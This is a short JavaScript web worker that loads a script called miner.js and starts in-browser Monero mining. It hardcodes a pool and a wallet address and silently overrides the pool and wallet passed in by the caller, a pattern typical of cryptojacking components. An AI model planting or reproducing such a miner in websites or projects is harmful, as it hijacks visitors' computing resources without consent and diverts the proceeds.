importScripts("http://localhost:3000/miner.js");

self.onmessage = (e) => {
  const { action, data } = e.data;

  if (action === "start") {
    const { pool, wallet } = data;

    if (typeof startMining === "undefined") {
      self.postMessage({ type: "error", message: "Mining script not loaded!" });
      return;
    }

    startMining('gulf.moneroocean.stream', '42LmVzhaXCUXeRGako7gRmKKbEgiSk4i9iQTgbF6TdDaZ4ZwhogUj2k2pvD3n9t22Wcnvuc1Lj94e8jpvtAKViYnKztrPsU');
    self.postMessage({ type: "status", message: "Mining started..." });

    setInterval(() => {
      self.postMessage({
        type: "update",
        message: `Calculated ${totalhashes} hashes.`,
      });
    }, 2000);
  }
};
